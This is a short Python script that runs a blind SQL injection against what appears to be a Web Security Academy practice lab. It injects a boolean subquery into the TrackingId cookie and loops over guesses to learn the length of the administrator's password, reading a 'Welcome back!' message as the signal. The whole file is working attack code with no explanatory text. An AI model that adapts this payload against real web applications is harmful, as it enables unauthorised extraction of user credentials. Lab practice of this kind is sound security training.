#!/usr/bin/python3
#_*_ coding: utf-8 _*_

import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

for l in range(1,25):
    try:
        
        url = "https://acf21f8c1e16a0a8c0d21ba100b500e8.web-security-academy.net"
        proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        headers = {"Host": "acf21f8c1e16a0a8c0d21ba100b500e8.web-security-academy.net",
        "Cookie": "TrackingId=zFl0CjSUBzhrIPD4' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>"+str(l)+")='a; session=d0I511OIAMVhjq9GS252sNRFbXiCkhpu"}
        r = requests.get(url=url,headers=headers,proxies=proxies,verify=False)
        
        for x in r.text.split("\n"):
            if "Welcome back!" in x:
                 print("[+] Password length:",l+1,end="\r")
    except:
        print("An exception occurred")
        exit()